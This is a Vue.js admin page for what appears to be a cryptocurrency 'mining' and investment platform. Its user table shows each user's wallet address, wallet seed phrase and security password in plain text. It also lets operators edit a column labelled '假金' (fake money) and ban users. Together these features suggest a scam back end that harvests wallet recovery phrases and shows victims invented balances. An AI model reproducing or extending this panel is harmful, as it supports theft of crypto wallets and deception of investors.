<template>
  <div class="app-container">
      <el-table
        v-loading="listLoading"
        :data="list"
        element-loading-text="Loading"
        border
        fit
        highlight-current-row
      >
        <el-table-column align="center" label="用户id" width="95">
          <template slot-scope="scope">
            {{ scope.row.id }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="用戶名稱" width="95">
          <template slot-scope="scope">
            {{ scope.row.username }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="用戶暱稱" width="95">
          <template slot-scope="scope">
            {{ scope.row.nickname }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="假金" width="95">
          <template slot-scope="scope">
            <a style="color: #216def" @click="yyyyy(scope.row.id)"> {{ scope.row.fake_amount }} </a>
          </template>
        </el-table-column>


        <el-table-column align="center" label="可提现餘額" width="95">
          <template slot-scope="scope">
            {{ scope.row.withdrawal_balance }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="挖礦餘額" width="95">
          <template slot-scope="scope">
            {{ scope.row.mining_balance }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="理財餘額" width="95">
          <template slot-scope="scope">
            {{ scope.row.invest_balance }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="狀態" width="95">
          <template slot-scope="scope" style="color: #20a0ff;">


            <a style="color: #216def" @click="modify(scope.row.id, scope.row.status )" >    {{ scope.row.status| statusFilter }} </a>

          </template>
        </el-table-column>

        <el-table-column align="center" label="會員等級" width="95">
          <template slot-scope="scope">
            <span> {{ scope.row.user_vip }} 級</span>
          </template>
        </el-table-column>

        <el-table-column align="center" label="邀請碼" width="95">
          <template slot-scope="scope">
            {{ scope.row.in_code }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="體驗金" width="95">
          <template slot-scope="scope">
            {{ scope.row.deliver_balance }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="挖礦等級" width="95">
          <template slot-scope="scope">
            {{ scope.row.mine_grade }} 級
          </template>
        </el-table-column>

        <el-table-column align="center" label="錢包類型" width="95">
          <template slot-scope="scope">
            {{ scope.row.wallet_type }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="錢包備註" width="95">
          <template slot-scope="scope">
            {{ scope.row.wallet_notes }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="錢包地址" width="95">
          <template slot-scope="scope">
            {{ scope.row.wallet_url }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="安全助記詞" width="95">
          <template slot-scope="scope">
            {{ scope.row.safety_mnemonic }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="安全密碼" width="95">
          <template slot-scope="scope">
            {{ scope.row.security_code }}
          </template>
        </el-table-column>

        <el-table-column align="center" label="更新時間" width="95">
          <template slot-scope="scope">
            {{ scope.row.update_at }}
          </template>
        </el-table-column>
        <el-table-column align="center" label="創建時間" width="95">
          <template slot-scope="scope">
            {{ scope.row.create_at }}
          </template>
        </el-table-column>
      </el-table>
      <div class="fenye"
           style="float: right; margin:13px; background: white; width: 100%; padding: 5px;"
      >
        <el-pagination
          background
          :page-size="100"
          :pager-count="11"
          layout="prev, pager, next"
          :total="100"
          style="float: right"
        >
        </el-pagination>
      </div>
  </div>
</template>

<script>
import { userlist, satus, upFakeAmount } from '@/api/table'

export default {
  filters: {
    statusFilter(status) {
      const statusMap = {
        1: '正常',
        2: '禁用'
      }
      return statusMap[status]
    }
  },
  data() {
    return {
      params: {
        page: 1,
        count: 100,
        order: 'desc'
      },

      bbbbbb: {
        userid: 0,
        fakeamount: 0,
      },
      gengxin: {
        userid: 0,
        status: 0,
      },
      list: [],
      listLoading: true
    }
  },
  created() {
    this.fetchData()
  },
  methods: {
    fetchData() {
      userlist(this.params.page, this.params.count, this.params.order).then(result => {
        if (result[0] == true) {
          this.listLoading = false
          this.list = result[1]
        }
      })
    },

    yyyyy(id, moey){
      var name=prompt("请输入金额", moey)

      if (name) {
        this.bbbbbb.userid = id;
        this.bbbbbb.fakeamount = name
        upFakeAmount(this.bbbbbb).then(result => {
          if (result[0] == true) {

            this.$message.success('更新成功')
            this.fetchData();
          }  else {
            this.$message.warning(result[0])
          }
        })
      }
    },


    modify(id, vale) {
      this.gengxin.userid = id

      if (vale == 1) {
        this.gengxin.status = 2;
      } else {
        this.gengxin.status = 1;
      }

      satus(this.gengxin).then(result => {
        if (result[0] == true) {
          this.$message.success('更新成功')
          this.fetchData();
        }  else {
          this.$message.warning(result[0])
        }
      })

    }
  }
}
</script>

<style scoped>
.app-container {
  overflow: auto;
  width: 100%;
  float: left;
  box-sizing: border-box;
}
</style>
